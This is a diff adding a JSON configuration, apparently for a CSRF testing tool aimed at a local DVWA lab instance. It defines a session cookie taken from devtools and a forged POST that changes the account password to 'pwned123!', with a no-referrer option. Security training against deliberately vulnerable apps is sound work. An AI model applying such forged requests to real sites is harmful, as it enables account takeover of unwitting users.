@@ -1,0 +1,29 @@
+{
+  "base_url": "http://localhost:8080",
+  "session_cookie": {
+    "name": "4bkaikq0utkto01in0keoiuc01",
+    "value": "PASTE_FROM_DEVTOOLS",
+    "domain": "localhost",
+    "path": "/",
+    "secure": false,
+    "httpOnly": false,
+    "sameSite": "Lax"
+  },
+  "actions": [
+    {
+      "name": "DVWA_ChangePassword",
+      "method": "POST",
+      "url": "http://localhost:8080/vulnerabilities/csrf/",
+      "params": {
+        "password_new": "pwned123!",
+        "password_conf": "pwned123!",
+        "Change": "Change"
+      },
+      "body_format": "form"
+    }
+  ],
+  "optional": {
+    "noreferrer": true,
+    "bounce_url": "http://localhost:8080"
+  }
+}
